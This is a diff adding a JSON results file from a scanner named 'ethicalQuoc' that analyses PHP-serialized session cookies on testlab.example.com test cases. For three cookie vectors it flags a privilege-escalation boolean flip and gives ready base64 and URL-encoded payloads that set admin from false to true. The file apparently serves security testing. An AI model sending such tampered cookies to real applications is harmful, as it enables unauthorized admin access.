@@ -1,0 +1,196 @@
+{
+    "metadata": {
+        "tool": "ethicalQuoc",
+        "version": "2025.1.0.0",
+        "scan_type": "Hybrid",
+        "phase": "analyze",
+        "target": "results/example_analyze.json",
+        "timestamp": "2026-09-02T13:45:57.977159"
+    },
+    "summary": {
+        "total_vectors": 4
+    },
+    "vectors": [
+        {
+            "vector": {
+                "url": "https://testlab.example.com/case-a1-target-first",
+                "method": "GET",
+                "location": "header",
+                "name": "Cookie",
+                "original_value": "session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=; other=abc123; tracking=xyz789"
+            },
+            "normalized": [
+                "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+            ],
+            "fingerprint": {
+                "value": "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}",
+                "type": "PHP",
+                "confidence": "High",
+                "risk_level": "High",
+                "subtype": null,
+                "gadget_detected": false,
+                "gadget_hints": [],
+                "all_candidates": {
+                    "PHP": 9
+                }
+            },
+            "exploit_analysis": {
+                "exploitable": true,
+                "exploit_type": "Privilege Escalation — Boolean Flip",
+                "score": 6,
+                "severity": "High",
+                "confidence_source": "static_signature",
+                "confirmation_status": "Suspected",
+                "display_severity": "Suspected-High",
+                "suggested_probe": "flip_boolean",
+                "notes": "Boolean field detected — try flipping b:0 → b:1"
+            },
+            "mutations": [
+                {
+                    "type": "flip_boolean",
+                    "chain": null,
+                    "command": null,
+                    "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+                    "payload_urlencoded": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D",
+                    "location": "header",
+                    "name": "Cookie",
+                    "url": "https://testlab.example.com/case-a1-target-first",
+                    "method": "GET",
+                    "encoding": "base64"
+                }
+            ]
+        },
+        {
+            "vector": {
+                "url": "https://testlab.example.com/case-a2-target-last",
+                "method": "GET",
+                "location": "header",
+                "name": "Cookie",
+                "original_value": "tracking=xyz789; other=abc123; session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30="
+            },
+            "normalized": [
+                "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+            ],
+            "fingerprint": {
+                "value": "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}",
+                "type": "PHP",
+                "confidence": "High",
+                "risk_level": "High",
+                "subtype": null,
+                "gadget_detected": false,
+                "gadget_hints": [],
+                "all_candidates": {
+                    "PHP": 9
+                }
+            },
+            "exploit_analysis": {
+                "exploitable": true,
+                "exploit_type": "Privilege Escalation — Boolean Flip",
+                "score": 6,
+                "severity": "High",
+                "confidence_source": "static_signature",
+                "confirmation_status": "Suspected",
+                "display_severity": "Suspected-High",
+                "suggested_probe": "flip_boolean",
+                "notes": "Boolean field detected — try flipping b:0 → b:1"
+            },
+            "mutations": [
+                {
+                    "type": "flip_boolean",
+                    "chain": null,
+                    "command": null,
+                    "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+                    "payload_urlencoded": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D",
+                    "location": "header",
+                    "name": "Cookie",
+                    "url": "https://testlab.example.com/case-a2-target-last",
+                    "method": "GET",
+                    "encoding": "base64"
+                }
+            ]
+        },
+        {
+            "vector": {
+                "url": "https://testlab.example.com/case-a3-target-middle",
+                "method": "GET",
+                "location": "header",
+                "name": "Cookie",
+                "original_value": "tracking=xyz789; session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=; other=abc123"
+            },
+            "normalized": [
+                "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+            ],
+            "fingerprint": {
+                "value": "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}",
+                "type": "PHP",
+                "confidence": "High",
+                "risk_level": "High",
+                "subtype": null,
+                "gadget_detected": false,
+                "gadget_hints": [],
+                "all_candidates": {
+                    "PHP": 9
+                }
+            },
+            "exploit_analysis": {
+                "exploitable": true,
+                "exploit_type": "Privilege Escalation — Boolean Flip",
+                "score": 6,
+                "severity": "High",
+                "confidence_source": "static_signature",
+                "confirmation_status": "Suspected",
+                "display_severity": "Suspected-High",
+                "suggested_probe": "flip_boolean",
+                "notes": "Boolean field detected — try flipping b:0 → b:1"
+            },
+            "mutations": [
+                {
+                    "type": "flip_boolean",
+                    "chain": null,
+                    "command": null,
+                    "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+                    "payload_urlencoded": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D",
+                    "location": "header",
+                    "name": "Cookie",
+                    "url": "https://testlab.example.com/case-a3-target-middle",
+                    "method": "GET",
+                    "encoding": "base64"
+                }
+            ]
+        },
+        {
+            "vector": {
+                "url": "https://testlab.example.com/case-b-content-disposition",
+                "method": "POST",
+                "location": "header",
+                "name": "Content-Disposition",
+                "original_value": "form-data; name=\"avatar\"; filename=\"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=.txt\""
+            },
+            "normalized": [
+                "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=.txt"
+            ],
+            "fingerprint": {
+                "value": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=.txt",
+                "type": "Unknown",
+                "confidence": "Low",
+                "risk_level": "Low",
+                "subtype": null,
+                "gadget_detected": false,
+                "gadget_hints": [],
+                "all_candidates": {}
+            },
+            "exploit_analysis": {
+                "exploitable": false,
+                "exploit_type": null,
+                "score": 0,
+                "severity": "Low",
+                "confidence_source": "static_signature",
+                "confirmation_status": "Suspected",
+                "display_severity": "Suspected-Low",
+                "suggested_probe": "unknown",
+                "notes": ""
+            },
+            "mutations": []
+        }
+    ]
+}
